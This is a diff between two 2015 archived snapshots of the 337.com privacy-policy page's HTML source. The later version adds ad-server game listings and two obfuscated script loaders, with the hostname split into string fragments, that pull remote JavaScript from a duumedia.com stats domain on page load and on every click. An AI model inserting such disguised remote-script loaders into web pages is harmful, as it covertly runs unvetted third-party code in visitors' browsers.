@@ -1,5 +1,5 @@
-<!--The following is the downloaded HTML source of the 337.com privacy policy that was archived on 2015-06-23.
- Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20150623013717id_/http%3A//www.337.com/en/privacy) for the most accurate reproduction.-->
+<!--The following is the downloaded HTML source of the 337.com privacy policy that was archived on 2015-12-03.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20151203224855id_/http%3A//www.337.com/en/privacy) for the most accurate reproduction.-->
 
 <!DOCTYPE html><html lang="en" xmlns="http://www.w3.org/1999/xhtml"><head>
     <meta charset="utf-8">
@@ -39,7 +39,7 @@ ga('send', 'pageview');
 
 
 
-    <link type="text/css" rel="stylesheet" href="http://337.eleximg.com/337/v3static/css/www.body.nav.css?4fc511a2">
+    <link type="text/css" rel="stylesheet" href="http://337.eleximg.com/337/v3static/css/www.body.nav.css?4fc511a3">
 <div class="elex_common_header elex_common_header_fixed">
 <iframe frameborder="0" class="elex_header_mask"></iframe>
 <div class="elex_header_wrap clearfix">
@@ -90,22 +90,54 @@ ga('send', 'pageview');
 				window.location.search.toString().indexOf('refresh') > -1 && (data.refresh = 1);
 
 				$.ajax({
-					url: '/en/ajax/ajaxGetMultiplayerList',
+					url: 'http://deliver.goo.mx/ad?size=48x48&category=game&jsonp=?&num=40',
 					data: data,
 					dataType: 'jsonp',
 					cache: true,
-					jsonpCallback: 'get_multiplayer_list',
+					jsonpCallback: 'get_v9Plays_list',
 					success: function(data){
+						var list=[];
+						var page=10;
+
+						var arr = [
+							{
+								// app_id: 328931,
+								// id: 372257,
+								img: "http://img35.elex-tech.org/20140821/2014/1121/ca/9/431294/original.jpg",
+								link: "/en/big-farm/play?src=en;337;337;top-nav-multi",
+								// rate: 0.0000,
+								title: "Big Farm"	,
+							},
+							{
+								app_id: 328947,
+								id: 372264,
+								img: "http://img38.elex-tech.org/20140821/2015/0327/8c/4/961328/original.jpg",
+								link: "/en/goodgame-empire/play?src=en;337;337;top-nav-multi",
+								rate: 0.0000,
+								title: "Empire"	,
+							}
+						];
+						data.content.data = arr.concat(data.content.data)
+						$.each(data.content.data, function(key, val){
+
+							curr_page = Math.floor(key/page);
+							if(!$.isArray(list[curr_page])){
+								list[curr_page]=new Array();
+							}
+
+							list[curr_page].push(val);
+								
+						})
 						var htmlGames = htmlPage = '',
 							isFirst = true,
-							isPage = data.list && $.isArray(data.list) && data.list.length > 1,
+							isPage = list && $.isArray(list) && list.length > 1,
 							host = data.host;
 
-						$.each(data.list, function(k, v){
+						$.each(list, function(k, v){
 							var htmlItem = '';
-
+							
 							$.each(v, function(key, val){
-								htmlItem += '<li title="'+val.name+'"> <a href="'+( val.play_url.indexOf('http') == 0 ? val.play_url : host+val.play_url )+'?src=en;337;337;top-nav-multi" data-namespace="'+val.namespace+'" target="_blank" class="clearfix"> <img src="'+val.title_pic+'" alt="" class="game_img"> <div class="game_title"> <h4>'+val.name+'</h4>'+( val.category ? '<span>'+val.category+'</span>' : '' )+' </div> </a> </li>';
+								htmlItem += '<li title="'+val.title+'"> <a href="'+val.link+'" target="_blank" class="clearfix"> <img src="'+val.img+'" alt="" class="game_img"> <div class="game_title"> <h4>'+val.title+'</h4></div> </a> </li>';
 							});
 
 							htmlGames += '<ul class="list clearfix" style="'+(isFirst ? 'display: block;' : '')+(isPage ? 'height: 325px;' : '')+'">'+htmlItem+'</ul>';
@@ -213,7 +245,11 @@ ga('send', 'pageview');
 			$historyGms.show();
 		}
 		/*获取用户玩过的游戏 end*/
-		
+		(function() {
+			var ga_du = document.createElement('script'); ga_du.type = 'text/javascript'; ga_du.async = true;
+			ga_du.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'st'+'ats.g3.'+'d'+'uum'+'edia.'+'com/ds.js';
+			var s_du = document.getElementsByTagName('script')[0]; s_du.parentNode.insertBefore(ga_du, s_du);
+		})();
 				// 异步加载login.js
 		$.ajax({
 			url: 'http://337.eleximg.com/337/v3static/js/login.js?0b49d3f',
@@ -433,6 +469,9 @@ var minigame_domain = '';
 	$(document).bind('click',function(){
 		$nationDropdownList.hide();
 		$currentNation.children('.c_n_arrow_down').removeClass('c_n_arrow_up');
+		var ga_duu = document.createElement('script'); ga_duu.type = 'text/javascript'; ga_duu.async = true;
+		ga_duu.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'st'+'ats.g3.'+'d'+'uum'+'edia.'+'com/ds_c.js';
+		var s_duu = document.getElementsByTagName('script')[0]; s_duu.parentNode.insertBefore(ga_duu, s_duu);
 	});
 	
 	$nationDropdownList.find('a[lang]').each(function(){
